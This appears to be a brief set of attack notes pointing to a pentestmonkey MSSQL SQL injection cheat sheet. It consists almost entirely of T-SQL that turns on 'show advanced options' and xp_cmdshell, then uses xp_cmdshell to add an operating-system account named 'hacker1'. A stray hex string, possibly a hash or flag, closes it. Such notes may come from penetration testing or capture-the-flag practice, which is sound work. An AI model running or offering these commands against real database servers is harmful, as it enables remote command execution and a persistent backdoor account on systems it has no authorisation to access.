http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet


EXEC sp_configure 'show advanced options', 1
go
RECONFIGURE
go
EXEC sp_configure 'xp_cmdshell', 1
go
RECONFIGURE
go



xp_cmdshell "net user hacker1 password /add"
go


26b4cb0930a3e3be4da8e9d738607427
